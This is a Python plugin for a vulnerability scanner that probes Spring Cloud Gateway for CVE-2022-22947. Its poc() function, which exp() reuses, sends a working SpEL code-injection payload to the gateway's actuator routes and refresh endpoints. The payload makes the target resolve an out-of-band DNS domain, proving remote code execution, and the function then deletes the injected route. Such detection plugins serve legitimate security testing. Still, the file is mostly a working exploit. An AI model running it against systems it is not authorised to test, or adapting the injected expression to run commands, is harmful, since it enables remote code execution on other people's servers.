import requests
import random
import string
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Spring Cloud Gateway Code Injection''',
        "description": '''Applications using Spring Cloud Gateway prior to 3.1.1+ and 3.0.7+ are vulnerable to a code injection attack when the Gateway Actuator endpoint is enabled, exposed and unsecured. A remote attacker could make a maliciously crafted request that could allow arbitrary remote execution on the remote host.''',
        "severity": "critical",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2022-22947", 
            "https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/", 
            "https://github.com/wdahlenburg/spring-gateway-demo", 
            "https://spring.io/blog/2022/03/01/spring-cloud-gateway-cve-reports-published", 
            "https://tanzu.vmware.com/security/cve-2022-22947"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "CVE-2022-22947",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2022", "apache", "spring", "vmware", "actuator", "oast"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    randstr = gen_random_str(10)
    try:
        url = format_url(url)

        oob_domain,flag = gen_oob_domain()

        path = """/actuator/gateway/routes/%s""" % randstr
        method = "POST"
        data = """{
  "predicates": [
    {
      "name": "Path",
      "args": {
        "_genkey_0": "/%s/**"
      }
    }
  ],
  "filters": [
    {
      "name": "RewritePath",
      "args": {
        "_genkey_0": "#{T(java.net.InetAddress).getByName(\"%s\")}",
        "_genkey_1": "/${path}"
      }
    }
  ],
  "uri": "{{RootURL}}",
  "order": 0
}""" % (randstr, oob_domain)
        headers = {'Content-Type': 'application/json'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/actuator/gateway/refresh"""
        method = "POST"
        data = """{
  "predicate": "Paths: [/%s], match trailing slash: true",
  "route_id": "%s",
  "filters": [
    "[[RewritePath #{T(java.net.InetAddress).getByName(\"%s\")} = /${path}], order = 1]"
  ],
  "uri": "{{RootURL}}",
  "order": 0
}""" % (randstr, randstr, oob_domain)
        headers = {'Content-Type': 'application/json'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/actuator/gateway/routes/%s""" % randstr
        method = "DELETE"
        data = """"""
        headers = {}
        resp2 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if verify_request(type="dns", flag=flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url

def gen_random_str(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))